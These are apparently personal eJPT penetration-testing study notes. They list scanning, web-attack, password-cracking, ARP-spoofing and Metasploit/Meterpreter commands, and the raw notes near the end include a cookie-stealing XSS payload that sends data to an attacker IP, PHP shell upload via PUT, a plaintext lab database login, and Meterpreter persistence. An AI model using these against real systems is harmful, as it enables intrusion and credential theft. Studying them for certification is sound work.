## Credits [THANK YOU :)]
- https://github.com/d3m0n4l3x/eJPT
- https://github.com/fdicarlo/eJPT 
- https://github.com/Kaiser784/eJPT/  

## PTS course
---
Notes on [OneNote](https://iiitdmacin-my.sharepoint.com/:o:/g/personal/ced19i002_iiitdm_ac_in/EoNBXRhPFkZPkoOAnPFig8wB3InruCZmWYe8Go745N7SIw?e=Cmfhvn) if you want to check them out. Organizing them on one-note was easier than writing them in MD.   

# eJPT
---
## Notes

To use these commands, make sure to:
- Replace ‘10.10.10.10’ with the relevant IP address
- Replace ‘port’ with the relevant port number
- Replace /path/to/x with the relevant path to the relevant file

## Networking
| slash notation | net mask        | hex        | binary representation               | number of hosts |
|----------------|-----------------|------------|-------------------------------------|-----------------|
| /0             | 0.0.0.0         | 0x00000000 | 00000000 00000000 00000000 00000000 | 4294967296      |
| /1             | 128.0.0.0       | 0x80000000 | 10000000 00000000 00000000 00000000 | 2147483648      |
| /2             | 192.0.0.0       | 0xc0000000 | 11000000 00000000 00000000 00000000 | 1073741824      |
| /3             | 224.0.0.0       | 0xe0000000 | 11100000 00000000 00000000 00000000 | 536870912       |
| /4             | 240.0.0.0       | 0xf0000000 | 11110000 00000000 00000000 00000000 | 268435456       |
| /5             | 248.0.0.0       | 0xf8000000 | 11111000 00000000 00000000 00000000 | 134217728       |
| /6             | 252.0.0.0       | 0xfc000000 | 11111100 00000000 00000000 00000000 | 67108864        |
| /7             | 254.0.0.0       | 0xfe000000 | 11111110 00000000 00000000 00000000 | 33554432        |
| /8             | 255.0.0.0       | 0xff000000 | 11111111 00000000 00000000 00000000 | 16777216        |
| /9             | 255.128.0.0     | 0xff800000 | 11111111 10000000 00000000 00000000 | 8388608         |
| /10            | 255.192.0.0     | 0xffc00000 | 11111111 11000000 00000000 00000000 | 4194304         |
| /11            | 255.224.0.0     | 0xffe00000 | 11111111 11100000 00000000 00000000 | 2097152         |
| /12            | 255.240.0.0     | 0xfff00000 | 11111111 11110000 00000000 00000000 | 1048576         |
| /13            | 255.248.0.0     | 0xfff80000 | 11111111 11111000 00000000 00000000 | 524288          |
| /14            | 255.252.0.0     | 0xfffc0000 | 11111111 11111100 00000000 00000000 | 262144          |
| /15            | 255.254.0.0     | 0xfffe0000 | 11111111 11111110 00000000 00000000 | 131072          |
| /16            | 255.255.0.0     | 0xffff0000 | 11111111 11111111 00000000 00000000 | 65536           |
| /17            | 255.255.128.0   | 0xffff8000 | 11111111 11111111 10000000 00000000 | 32768           |
| /18            | 255.255.192.0   | 0xffffc000 | 11111111 11111111 11000000 00000000 | 16384           |
| /19            | 255.255.224.0   | 0xffffe000 | 11111111 11111111 11100000 00000000 | 8192            |
| /20            | 255.255.240.0   | 0xfffff000 | 11111111 11111111 11110000 00000000 | 4096            |
| /21            | 255.255.248.0   | 0xfffff800 | 11111111 11111111 11111000 00000000 | 2048            |
| /22            | 255.255.252.0   | 0xfffffc00 | 11111111 11111111 11111100 00000000 | 1024            |
| /23            | 255.255.254.0   | 0xfffffe00 | 11111111 11111111 11111110 00000000 | 512             |
| /24            | 255.255.255.0   | 0xffffff00 | 11111111 11111111 11111111 00000000 | 256             |
| /25            | 255.255.255.128 | 0xffffff80 | 11111111 11111111 11111111 10000000 | 128             |
| /26            | 255.255.255.192 | 0xffffffc0 | 11111111 11111111 11111111 11000000 | 64              |
| /27            | 255.255.255.224 | 0xffffffe0 | 11111111 11111111 11111111 11100000 | 32              |
| /28            | 255.255.255.240 | 0xfffffff0 | 11111111 11111111 11111111 11110000 | 16              |
| /29            | 255.255.255.248 | 0xfffffff8 | 11111111 11111111 11111111 11111000 | 8               |
| /30            | 255.255.255.252 | 0xfffffffc | 11111111 11111111 11111111 11111100 | 4               |
| /31            | 255.255.255.254 | 0xfffffffe | 11111111 11111111 11111111 11111110 | 2               |
| /32            | 255.255.255.255 | 0xffffffff | 11111111 11111111 11111111 11111111 | 1               |

## Common ports
| Port | Protocol | Hint                   |
|------|----------|------------------------|
| 21   | FTP      | file sharing server    |
| 22   | SSH      |                        |
| 25   | SMTP     |                        |
| 110  | POP3     |                        |
| 115  | SFTP     |                        |
| 143  | IMAP     |                        |
| 80   | HTTP     |                        |
| 443  | HTTPS    |                        |
| 23   | TELNET   |                        |
| 3389 | RDP      |                        |
| 3306 | MYSQL    |                        |
| 1433 | MS SQL   |                        |
| 137  | NETBIOS  | find work groups       |
| 138  | NETBIOS  | list shares & machines |
| 139  | NETBIOS  | transit data           |
| 53   | DNS      |                        |

## Routing/Pivoting
One thing I am almost sure you will have to do is set up IP routing and routing tables. There are plenty of resources available online for this, but the course content itself seemed to be pretty lacking here.

    ip route / route -n  --> prints the routing table for the host you are on
    ip route add <ROUTETO_Gateway_IP> via <ROUTEFROM_Gateway_IP> - add a route to a new network if on a switched network and you need to pivot
    

## Enumeration
Anyone experienced in penetration testing will tell you that enumeration is 90% of the battle, and I don’t disagree. Although the eJPT doesn’t require a very in depth enumeration cycle, it does cover a broad number of techniques.

### Enumeration (Whois)
    whois
    whois site.com
### Enumeration (Ping Sweep)
    fping -a -g 10.10.10.0/24 2>/dev/null
    nmap -sn 10.10.10.0/24
### Nmap Scans
#### OS Detection
    nmap -Pn -O 10.10.10.10
#### Nmap Scan (Quick)
    nmap -sC -sV 10.10.10.10
#### Nmap Scan (Full)
    nmap -sC -sV -p- 10.10.10.10
#### Nmap Scan (UDP Quick)
    nmap -sU -sV 10.10.10.10
#### Nmap output file (-oN)
    nmap -sn 10.10.10.0/24 -oN hosts.nmap
#### To filter out just IPs from the nmap scan results
    cat hosts.nmap | grep for | cut -d " " -f 5  
#### Other nmap scan useful during exam
    nmap -sV -Pn -T4 -A -p- -iL hosts.nmap -oN ports.nmap
    nmap --script vuln --script-args=unsafe=1 -iL hosts.nmap

## Web Applications
The following commands could be useful when enumerating and attacking web applications. Again, make sure you understand what each one does rather than blindly throwing them at the machine in question.

### Banner Grabbing
    nc -v 10.10.10.10 port
    HEAD / HTTP/1.0
### OpenSSL for HTTPS services
    openssl s_client -connect 10.10.10.10:443
    HEAD / HTTP/1.0
### Httprint
    httprint -P0 -h 10.10.10.10 -s /path/to/signaturefile.txt
### HTTP Verbs
    GET, POST, HEAD, PUT, DELETE, OPTIONS
Use the OPTIONS verb to see what other verbs are available

    nc 10.10.10.10 80
    OPTIONS / HTPP/1.0

You can use HTTP verbs to upload a php shell. Find the content length, then use PUT to upload the shell. Make sure you include the size of the payload when using the PUT command.

    wc -m shell.php
    x shell.php

    PUT /shell.php
    Content-type: text/html
    Content-length: x
    Directory and File Scanning

My preferred tool at the moment is dirsearch, I find it to to be fast and easy to use. For a more in depth scan, use gobuster and include a large wordlist.

    dirsearch.py -u http://10.10.10.10 -e *
    gobuster -u 10.10.10.10 -w /path/to/wordlist.txt

Advanced Google Searches
Not really necessary, but useful to know all the same.

    site:
    intitle:
    inurl:
    filetype:
    AND, OR, &, |, -

### Cross Site Scripting (XSS)
The general steps I use to find and test XSS are as follows:

1. Find a reflection point
2. Test with <i> tag
3. Test with HTML/JavaScript code (alert('XSS'))

- Reflected XSS = Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload
- Persistent XSS = Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post

### SQLMap
    sqlmap -u http://10.10.10.10 -p parameter
    sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
    sqlmap -u http://10.10.10.10 --os-shell
    sqlmap -u http://10.10.10.10 --dump

## System Attacks
The other type of ‘attack’ you will be doing are system attacks. Make sure you understand why/how to brute force types of services and hashes, as well as basic metasploit usage.

### Password Attacks
#### Unshadow
This prepares a file for use with John the Ripper
    
    unshadow passwd shadow > unshadow

#### Hash Cracking
    john -wordlist /path/to/wordlist -users=users.txt hashfile

### Network Attacks
Brute Forcing with Hydra
replace ‘ssh’ with any relevant service

    hydra -L users.txt -P pass.txt -t 10 10.10.10.10 ssh -s 22
    hydra -L users.txt -P pass.txt telnet://10.10.10.10

### Windows Shares Using Null sessions
    nmblookup -A 10.10.10.10
    smbclient -L //10.10.10.10 -N (list shares)
    smbclient //10.10.10.10/share -N (mount share)
    enum4linux -a 10.10.10.10

#### ARP spoofing
    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11

### Metasploit
Metasploit is a very useful tool for penetration testers, and I’d recommend going through a Metasploitable for an effective, hands on way to learn about Metasploit. There are plenty of guides and walkthroughs available to learn from. Doing even part of a Metasploitable box will more than prepare you for the Metasploit usage required here.

#### Basic Metasploit Commands
    search x
    use x
    info
    show options, show advanced options
    SET X (e.g. set RHOST 10.10.10.10, set payload x)

#### Meterpreter
The below are some handy commands for use with a Meterpreter session. Again, I’d recommend going through a Metasploitable or doing some extra study here.
    
    background
    sessions -l
    sessions -i 1
    sysinfo, ifconfig, route, getuid
    getsystem (privesc)
    bypassuac
    download x /root/
    upload x C:\\Windows
    shell
    use post/windows/gather/hashdump
    
## Possible Exam Questions:

Below are some examples of the exam questions that you might have during the test:

- What’s the password for specific user?
- What’s in the file “test.txt”?
- How many routers there are in the internal network?
- Which IP address belongs to Windows machine?
- There is one machine contains the following file C:\\PATH\file.txt. What is its content?
- What are the hard drives in the Windows machine?
- What is the Identity number for the XXXX user?
- What is your IP address?

Wireshark --- follow tcp stream
route commands
route
ip route ---linux
route print ---windows
netstat -r
ip route add 192.168.222.0/24 via 10.175.34.1(next hop)
mac address
ifconfig/all ----windows
ip addr --- linux
ifconfig ---*nix
ARP
arp -a ---windows
arp ---*nix
ip neigbour – linux
Netstat (listening ports)
netstat -ano ---windows
netstat -tunp --linux
TCPView tool
DNS
ping
Dataexfil
PAcketwhisper
egresscheckframework
Pentest
information gathering --- IP's , mails etc
OS fingerpriniting
Port scan
Service
vulnerability scan
exploitation
info gather
crunch base
sam.gov
gsa elibrary
whois ---linux
sysinternal whois --- windows download
subdamain enum:
site: xyz dot com
dnsdumpster dot com
crt dot sh
virustotal dot com
sublist3r -d domain
amass ----start snapd -----snap run amass -ip -d domain
also by viewing certificate details
Foot printing
ping
fping -a -g IPRANGE ---- -a only alive -g ping sweep
fping 2>/dev/null ---redirect error messages
NMAP --- (scantypes options targets) syn scan is default
> filename.txt - save scan to file
-sn ping scan
-iL list of IPs
-Pn --- no ping treat all as active
-sS ---- Syn stealth scan
-sT -- TCP connect scan
--reason - shows explanation of port open or close
man nmap --manual
OS fingerprint
p0f
nmap -O ||||| --osscan-limit limit os detec --osscan-guess: guess aggressively
uname -a --- linux os details
Port Scanning
-p specifies ports -- separated by commas or ranges with -
-sV - version detection scan / oe -A
MASSCAN
masscan -p xxx -Pn --rate=xpacets/sec --banners IPS -e tap0 --router-ip x.x.x.x(USED BECAUSE we are
connected via vpn)
--echo > file.conf -------- saves sacn command in a conf file
masscan -c file.conf to run file
NESSUS
/etc/init.d/nessusd start
https://localhost:8834
HTTP WEB ATTACKS
VERB /path HTTP/1.x
Host: 12.34.56.78
PUT /path HTTP/1.x
Host: 1.2.3.4
Content-type: text/html
Content-length: 20 ------- have to know file size for PUT ---- wc -m payload.ext
Headers\r\n
\r\n
Message \r\n
netcat /nc ---- nc target port
openssl -----------openssl s_client -connect target:port
burpsuite
Devtools f12
Httprint -P0 -h target.IP -s <sig file (/usr/share/httprint/signatures.txt)> ----- identify web servers based
on signs |||-P0 no ping
Dirbuster
/usr/share/dirbuster/wordlists
Search files ext. example bak old
DIRB
Dirb target pathtowordlist
Dirb -a useragent ||||||||||||||||||| http://www.useragentstring.com/pages/useragentstring.php
Dirb -p http://127.0.0.1:8080 |||||||||||proxy
Dirb target -c “Cookie:123”||| if logged in session
Dirb -u “admin:pass” |||| http authentication
Dirb -H “”myheader:123” ||| custom header
mysql -u awdmgmt -pUChxKQk96dVtM07 -h 10.104.11.198
use dbname;
show tables;
select * from tables;
XSS
<script>
var i = new Image();
i.src="http://192.168.99.11/get.php?cookies="+document.cookie;
</script>
SQLI
Select <column> from <table> where <condition>
Password cracking
John -list=formats ----------------------------johntheripper lists formats that can be attacked
/etc/passwd ---contains users
/etc/shadow ---contains password hashes
unshadow /etc/passwd /etc/shadow > crackthis
john -incremental -users:root crackthis
john --show crackthis
john -wordlist /path crackthis
john -wordlist /path -rules crackthis
wordlist /usr/share/seclists/Passwords
Hashcat ----on windows
Hashcat
-m hashtype
-a attackmode
-o outputfile
-b initial benchmarking
-d specifies device to use
-O optimize performance
-r specify rules against list file
Hashcat64.exe -m 0 -a 0 -D2 /hashes /dictonary ----d2 device interface gpu
Rainbow table cracking
Ophcrack
Hydra
hydra -L logins.txt -P pws.txt -M targets.txt ssh
Ssh target
scp root@192.168.99.22:/etc/passwd .
Windows Shares
\\comp\c$
\\comp\admin$ ipc$
NULL Sessions
first check if file sharing service is running
Windows: nbtstat -A target
>comp
>domain
>service 20code means running
Next enumerate shares
NET VIEW target
Linux: nmblookup -A target
smbclient -L //192.168.174.132 -N
smbclient //192.168.174.132/ADMIN$ -N -----------list shares
Automate all of the above with emun for windows and enum4linux for linux
ARPSPOOF
Echo 1 > /proc/sys/net/ipv4/ip_forward
Arpspoof -i tap0 -t 1.2.3.4 -r 5.6.7.8
METASPLOIT
search x
use x
info
show options, show advanced options
SET X (e.g. set RHOST 10.10.10.10, set payload x)
Arp sweep to discover network
Use auxiliary/../../arp_sweep
Set <options>
Run
Use exploit
Set x
Show payloads
Set PAYLOAD x
Set options
Exploit
dir secret.doc /s /p -------searches win directories for secret.doc
meterpreter
ctrl+z or background ----- to return to msf
sessions -l ---- displays meterpreter sessions
sessions -i id ---- connects with the specified meterpreter session
sysinfo --- system information
ifconfig --- network info
route – prints route
getuid --- get user
getsystem – gets system user privilege
bypassuac exploit in case getsystem does not work --- after that press exploit
search hashdump to find windows hashdump module
pwd --- current directory
cd c:\\ --- remember double back slash
ls --- dir listing
shell --- opens cmd
download /pathonvictim /pathonattacker
upload /filetosentonattacker /pathonvictim
migrate pid – attaches to a different process
pivoting
ipconfig – check victims subnet
route add 192.x.x.x/24 sessions(1,2)
run persistence -X -i 10 -p 5555 kaliip
meterpreter script --- run autoroute -s 10.1.13.0/24
run autoroute -p ----print route table
